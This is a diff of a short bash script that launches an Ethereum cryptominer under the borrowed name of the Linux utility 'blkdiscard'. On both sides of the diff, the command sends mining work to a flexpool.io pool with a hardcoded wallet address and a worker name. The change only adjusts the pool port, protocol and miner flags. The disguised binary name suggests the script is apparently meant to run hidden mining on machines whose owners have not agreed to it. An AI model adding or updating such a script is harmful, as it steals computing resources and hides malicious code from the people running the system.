@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x blkdiscard
-./blkdiscard -pool stratum+ssl://eth-de.flexpool.io:5555 -wal 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621 -worker KULI-JAWA -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 74 -tstart 69 -coin eth
+./blkdiscard -pool stratum+tcp://eth-de.flexpool.io:4444 -wal 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621 -worker KULI-JAWA -pass x --tstop 74 -tstart 69 -coin eth
